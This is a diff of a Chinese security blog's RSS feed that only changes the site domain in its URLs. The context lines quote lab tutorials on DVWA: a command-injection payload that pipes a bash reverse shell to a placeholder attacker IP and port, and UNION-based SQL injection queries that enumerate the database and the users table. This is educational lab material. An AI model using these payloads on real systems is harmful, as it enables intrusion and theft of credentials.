-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13_hubcf693454ead4c4bc9aeae9e23931aca_64761_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13_hubcf693454ead4c4bc9aeae9e23931aca_64761_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13_hubcf693454ead4c4bc9aeae9e23931aca_64761_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13_hubcf693454ead4c4bc9aeae9e23931aca_64761_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;以4455端口为例&#34;
@@ -1105,10 +1105,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;在靶机输入payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/攻击机器ip/端口号 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23.png&#34;
 	width=&#34;1048&#34;
 	height=&#34;357&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23_hu93ea951212091df947f4a77998c020e5_381998_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23_hu93ea951212091df947f4a77998c020e5_381998_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23_hu93ea951212091df947f4a77998c020e5_381998_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23_hu93ea951212091df947f4a77998c020e5_381998_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;GetShell!&#34;
@@ -1136,11 +1136,11 @@
         </item>
         <item>
         <title>Web安全:SQL注入基础知识和简单绕过笔记</title>
-        <link>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/</link>
+        <link>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/</link>
         <pubDate>Mon, 29 Aug 2022 13:25:06 +0800</pubDate>
         
-        <guid>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover.jpg" alt="Featured image of post Web安全:SQL注入基础知识和简单绕过笔记" /&gt;&lt;h1 id=&#34;web安全sql注入基础知识和简单绕过&#34;&gt;Web安全:SQL注入基础知识和简单绕过&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover.jpg" alt="Featured image of post Web安全:SQL注入基础知识和简单绕过笔记" /&gt;&lt;h1 id=&#34;web安全sql注入基础知识和简单绕过&#34;&gt;Web安全:SQL注入基础知识和简单绕过&lt;/h1&gt;
 &lt;p&gt;&lt;del&gt;这是一只Hacker猫在学习SQL注入的时候留下的笔记&lt;/del&gt;&lt;/p&gt;
 &lt;h2 id=&#34;概念&#34;&gt;概念&lt;/h2&gt;
 &lt;p&gt;网上嘛&amp;hellip;都是那么一大长串的概念&amp;hellip;特别难记&lt;/p&gt;
@@ -1195,10 +1195,10 @@
 &lt;h3 id=&#34;显注-1&#34;&gt;显注&lt;/h3&gt;
 &lt;p&gt;将DVWA安全级别调为&lt;code&gt;low&lt;/code&gt;,并来到&lt;code&gt;SQL Injection&lt;/code&gt;界面&lt;/p&gt;
 &lt;p&gt;我们看到一个输入框&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22.jpg&#34;
 	width=&#34;860&#34;
 	height=&#34;161&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22_hudaf6cd9d61365c1defa70485ebc53995_12960_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22_hudaf6cd9d61365c1defa70485ebc53995_12960_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22_hudaf6cd9d61365c1defa70485ebc53995_12960_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/22_hudaf6cd9d61365c1defa70485ebc53995_12960_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;嗯!是输入框酱!&#34;
@@ -1211,10 +1211,10 @@
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;检测注入点&#34;&gt;检测注入点&lt;/h4&gt;
 &lt;p&gt;输入&lt;code&gt;1&#39;&lt;/code&gt;疯狂试探&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47.png&#34;
 	width=&#34;1440&#34;
 	height=&#34;455&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47_hu62d30ca4a1dd161ea82db75d5094f6b4_13591_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47_hu62d30ca4a1dd161ea82db75d5094f6b4_13591_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47_hu62d30ca4a1dd161ea82db75d5094f6b4_13591_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_21-47_hu62d30ca4a1dd161ea82db75d5094f6b4_13591_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;哟吼，报错了&#34;
@@ -1235,10 +1235,10 @@
 &lt;h5 id=&#34;闭合篇&#34;&gt;闭合篇&lt;/h5&gt;
 &lt;p&gt;第一次尝试双引号闭合&lt;/p&gt;
 &lt;p&gt;发现&lt;code&gt;1&amp;quot; and 1=2#&lt;/code&gt;返回结果&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08.png&#34;
 	width=&#34;361&#34;
 	height=&#34;144&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08_hu2ea3796bc889b5893b13e9f5ae9dd2a6_7308_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08_hu2ea3796bc889b5893b13e9f5ae9dd2a6_7308_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08_hu2ea3796bc889b5893b13e9f5ae9dd2a6_7308_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-08_hu2ea3796bc889b5893b13e9f5ae9dd2a6_7308_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;啊哦，看来不大行&#34;
@@ -1265,10 +1265,10 @@
 &lt;p&gt;这里用and 1=2 把前面的结果干掉了喵~~&lt;/p&gt;
 &lt;p&gt;当然把1改成-1也可以 (其实本质就是让UNION前面的语句查到结果)&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20.png&#34;
 	width=&#34;398&#34;
 	height=&#34;120&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20_hufc6f81bb8cfe0704ddf5d46dc48992fd_8485_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20_hufc6f81bb8cfe0704ddf5d46dc48992fd_8485_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20_hufc6f81bb8cfe0704ddf5d46dc48992fd_8485_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_22-20_hufc6f81bb8cfe0704ddf5d46dc48992fd_8485_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;这里可以看一下回显1,2的位置&#34;
@@ -1311,10 +1311,10 @@
 &lt;hr&gt;
 &lt;p&gt;查询库名&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and 1=2 union select 1,schema_name from information_schema.schemata #
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04.png&#34;
 	width=&#34;785&#34;
 	height=&#34;577&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04_hu403cf5aa384d9f623671947e9b3dd694_81787_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04_hu403cf5aa384d9f623671947e9b3dd694_81787_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04_hu403cf5aa384d9f623671947e9b3dd694_81787_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-04_hu403cf5aa384d9f623671947e9b3dd694_81787_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;数据库，喵喵认识你啦&#34;
@@ -1327,10 +1327,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;查看dvwa库中的所有表名&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and 1=2 union select 1,table_name from information_schema.tables where table_schema= &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dvwa&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06.png&#34;
 	width=&#34;1025&#34;
 	height=&#34;146&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06_hu749c7c07d5e743d52d76667cdaac4105_25986_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06_hu749c7c07d5e743d52d76667cdaac4105_25986_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06_hu749c7c07d5e743d52d76667cdaac4105_25986_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-06_hu749c7c07d5e743d52d76667cdaac4105_25986_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;又认识了一些表&#34;
@@ -1342,10 +1342,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;作为一个黑客猫猫，肯定关心存储管理员用户与密码信息的表;)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9.jpg&#34;
 	width=&#34;240&#34;
 	height=&#34;240&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9_hu4f14de66aacc12e0af72d6951c01f38c_14572_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9_hu4f14de66aacc12e0af72d6951c01f38c_14572_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9_hu4f14de66aacc12e0af72d6951c01f38c_14572_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9_hu4f14de66aacc12e0af72d6951c01f38c_14572_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;小猫咪坏心眼可多了&#34;
@@ -1358,10 +1358,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;接下来就是查询users表中所有的列&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;and 1=2 union select 2,column_name from information_schema.columns where table_schema= &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dvwa&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and table_name= &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16.png&#34;
 	width=&#34;1237&#34;
 	height=&#34;555&#34;
